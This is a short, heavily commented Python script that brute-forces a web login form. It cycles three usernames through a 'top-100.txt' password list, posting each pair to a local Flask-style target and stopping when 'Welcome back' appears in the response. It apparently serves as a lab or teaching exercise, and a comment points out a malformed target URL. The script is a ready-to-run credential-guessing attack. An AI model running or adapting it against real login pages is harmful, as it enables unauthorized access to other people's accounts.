# Import necessary libraries
import requests  # For making HTTP requests
import sys      # For system-specific functions like writing to stdout

# Target URL for the login page
# NOTE: There's a typo - should be "http://127.0.0.1:5000"
target = "http:127.0.0.1:5000"
# List of usernames to test
usernames = ['Admin', 'User', 'Guest']
# File containing passwords to test (common passwords list)
passwords = "top-100.txt"
# String to look for in response that indicates successful login
needle = "Welcome back"

# Loop through each username in the list
for username in usernames:

    # Open the password file for reading
    with open(passwords, 'r') as password_list:

        # Loop through each password in the file
        for password in password_list:

            # Remove newline character and encode password to bytes
            password = password.strip("\n").encode()

            # Display the current username:password attempt
            sys.stdout.write(
                f"[X] Attempting user:password -> {username}:{password.decode()}"
            )
            sys.stdout.flush()  # Force immediate output (no buffering)

            # Send POST request with username and password
            r = requests.post(
                target, data={"username": username, "password": password}
            )

            # Check if login was successful by searching for the needle in response
            if needle.encode() in r.content:

                # New line after previous output
                sys.stdout.write("\n")

                # Display success message
                sys.stdout.write(
                    f"[>>>>>] Valid password '{password.decode()}' found for user: {username}|"
                )
                sys.exit()  # Exit program when valid credentials are found

        # Flush output buffer after trying all passwords for current username
        sys.stdout.flush()

        # New line for formatting
        sys.stdout.write("\n")

        # Display message if no password worked for this username
        sys.stdout.write(f"\tNo password found for {username}")

        # New line for formatting
        sys.stdout.write("\n")
